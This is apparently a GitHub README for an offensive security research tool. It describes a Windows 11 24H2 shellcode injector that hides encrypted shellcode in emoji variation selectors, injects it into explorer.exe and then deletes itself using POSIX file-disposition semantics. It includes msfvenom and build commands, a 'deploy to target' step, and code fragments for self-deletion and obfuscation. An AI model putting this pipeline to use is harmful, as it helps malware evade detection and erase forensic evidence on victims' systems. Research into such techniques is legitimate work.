```
  ███╗   ██╗██╗   ██╗██╗     ██╗
  ████╗  ██║██║   ██║██║     ██║
  ██╔██╗ ██║██║   ██║██║     ██║
  ██║╚██╗██║██║   ██║██║     ██║
  ██║ ╚████║╚██████╔╝███████╗███████╗
  ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚══════╝

  Nothing left behind
```

# Project NULL

> **Windows 11 24H2 Compatible Self-Deletion with Multi-Layer Obfuscation**

[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Platform: Windows](<https://img.shields.io/badge/Platform-Windows%2011%2024H2+-blue>)]()
[![Research](<https://img.shields.io/badge/Type-Security%20Research-orange>)]()

A security research project demonstrating **POSIX-based self-deletion** on Windows 11 24H2, combined with **emoji steganography**, **AES-256 encryption**, and **compile-time string obfuscation**. Developed as part of my Windows security research and presented at **Nullcon 2026**.

> **⚠️ DISCLAIMER:** This tool is provided **strictly for authorized security research, penetration testing, and educational purposes**. Use only on systems you own or have explicit authorization to test. The authors are not responsible for any misuse.

---

## 📖 Background

In September 2024, Microsoft released **Windows 11 24H2** with undocumented NTFS driver changes that broke the industry-standard [LloydLabs self-deletion technique](https://github.com/LloydLabs/delete-self-poc) (ADS-based). This left security researchers and red teams without a reliable method for clearing forensic artifacts on modern Windows.

This research fills that gap by discovering that the **`FILE_DISPOSITION_POSIX_SEMANTICS`** flag — originally designed for WSL compatibility — achieves **complete, forensically-sound file deletion** on Windows 11 24H2.

---

## 🏗️ Architecture

```
┌─────────────────────────────────────────────────────────┐
│                    Build Pipeline                       │
│  shellcode.bin ──► AES-256 Encrypt ──► Emoji Encode     │
│                         │                    │          │
│                    AES Key (split + XOR)     │          │
│                         │                    │          │
│                         ▼                    ▼          │
│              C++ Template Injection + Compile           │
└─────────────────────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────┐
│                  Runtime Pipeline                       │
│                                                         │
│  1. Emoji Payload (embedded) ──► Unicode Decode         │
│  2. Key Derivation (4 chunks) ──► AES-256 Decrypt       │
│  3. Find explorer.exe ──► Process Injection (CRT)       │
│  4. Sleep(2s) ──► POSIX Self-Deletion                   │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

---

## 📁 Project Structure

```
NULL/
├── main.cpp                    # Basic injector
│   └── POSIX self-deletion + CreateRemoteThread injection
│
├── simple_emoji_injector.cpp   # Advanced injector (full pipeline)
│   └── Emoji steganography + AES-256 + XOR strings + POSIX deletion
│
├── build_payload.py            # Basic build script
│   └── bin → C array → compile with MinGW
│
├── build_emoji_payload.py      # Advanced build script
│   └── Encrypt → emoji encode → inject template → compile
│
├── NullCon_Self_Del.mp4        # Demo video (Nullcon 2026)
├── LICENSE                     # MIT License
├── README.md                   # This file
├── CHANGELOG.md                # Release history
├── SECURITY.md                 # Security policy
├── .gitattributes              # Git LFS tracking (demo video)
└── .gitignore                  # Git ignore rules
```

---

## 🎬 Demo

Watch the full self-deletion demonstration on Windows 11 24H2:

**[▶ NullCon_Self_Del.mp4](NullCon_Self_Del.mp4)** — demo video from the Nullcon 2026 presentation.

---

## 🚀 Quick Start

### Prerequisites

**Compiler (one of):**

- **Linux:** `sudo apt install g++-mingw-w64-x86-64`
- **macOS:** `brew install mingw-w64`
- **Windows:** [MSYS2](https://www.msys2.org/) → `pacman -S mingw-w64-x86_64-toolchain`

**Python Dependencies:**

```bash
pip install pycryptodome
```

### Option 1: Basic Injector (No Obfuscation)

```bash
# 1. Generate shellcode (e.g., from Havoc, Cobalt Strike, or msfvenom)
msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o shellcode.bin

# 2. Build with Python script
python build_payload.py \
    -b shellcode.bin \
    -t main.cpp \
    -o basic_injector.exe

# 3. Deploy to target (Windows 11 24H2)
# The executable will inject into explorer.exe and self-delete
```

### Option 2: Emoji-Obfuscated Injector (Full Pipeline)

```bash
# 1. Generate shellcode
msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o shellcode.bin

# 2. Build with emoji obfuscation
python build_emoji_payload.py \
    -b shellcode.bin \
    -t simple_emoji_injector.cpp \
    -o emoji_payload.exe

# 3. The output binary contains:
#    - AES-256-CBC encrypted shellcode
#    - Emoji-steganographic payload (Unicode variation selectors)
#    - XOR-obfuscated API strings
#    - POSIX-based self-deletion
```

### Option 3: Cross-Compilation (Linux/macOS → Windows)

```bash
# On Kali Linux / Ubuntu / macOS
# The build scripts auto-detect MinGW cross-compiler
python build_emoji_payload.py \
    -b shellcode.bin \
    -t simple_emoji_injector.cpp \
    -o payload.exe
# Produces Windows PE executable from Linux/macOS
```

---

## 🔬 Technical Details

### POSIX Self-Deletion (Core Innovation)

The key discovery: `FILE_DISPOSITION_POSIX_SEMANTICS` (flag `0x00000002`) bypasses Windows 11 24H2's broken ADS handling.

```cpp
// The critical code that makes self-deletion work on 24H2
FILE_DISPOSITION_INFORMATION_EX dispo = {};
dispo.Flags = FILE_DISPOSITION_DELETE | FILE_DISPOSITION_POSIX_SEMANTICS;  // 0x00000003

IO_STATUS_BLOCK iosb = {};
NtSetInformationFile(hFile, &iosb, &dispo, sizeof(dispo), 
                     (FILE_INFORMATION_CLASS)64);  // FileDispositionInformationEx
```

**Why it works:**

- Legacy technique: `SetFileInformationByHandle` with `FileDispositionInfo` → **broken on 24H2** (ADS persists)
- This technique: `NtSetInformationFile` with `FileDispositionInformationEx` + POSIX flag → **complete deletion**

### Emoji Steganography

Shellcode is hidden inside Unicode Variation Selectors (U+FE00 to U+FE0F), making it appear as innocent emoji text:

```python
# Encoding: 4 bits per variation selector
byte = 0xAB           # 10101011
high = (byte >> 4)    # 0xA → U+FE0A
low = byte & 0x0F     # 0xB → U+FE0B
# Result: 😈︊︋ (emoji + 2 invisible variation selectors)
```

### AES-256 Encryption

- 256-bit key split into 4 × 64-bit chunks
- Each chunk XOR-encrypted for obfuscation
- SHA-256 hash-based key derivation (Windows Crypto API)
- PKCS7 padding

### String Obfuscation

Compile-time XOR encryption via C++ templates:

```cpp
// Strings are encrypted at compile time, decrypted at runtime
GetModuleHandleW(OBFUSCATE(L"ntdll.dll"));
GetProcAddress(hNtdll, OBFUSCATE("NtSetInformationFile"));
```

---

## 📜 Citation

If you use this research in academic work, please cite:

```bibtex
@misc{jakkaraju2026null,
  author = {Jakkaraju, Varshith},
  title = {Project NULL: Windows 11 24H2 Compatible Self-Deletion with Multi-Layer Obfuscation},
  year = {2026},
  howpublished = {Presented at Nullcon 2026},
  publisher = {GitHub},
  url = {https://github.com/Varshith-JV-1410/Project-NULL}
}
```

---

## 🙏 Acknowledgments

- [LloydLabs](https://github.com/LloydLabs/delete-self-poc) — For the original self-deletion technique (pre-24H2)
- [Jonas Lykkegård](https://x.com/jonasLyk) — For the original self-deletion discovery
- [sixtyvividtails](https://x.com/sixtyvividtails) — For contributions to the NTFS analysis

---

## 📄 License

This project is licensed under the MIT License — see the [LICENSE](LICENSE) file for details.

---

## 📝 Further Reading

There is one more interesting blog that worked on the same research area and has good technical details on the NTFS driver analysis: [The Not-So Self-Deleting Executable on 24H2](https://tkyn.dev/2025-6-8-The-Not-So-Self-Deleting-Executable-on-24h2/) by tkyn.
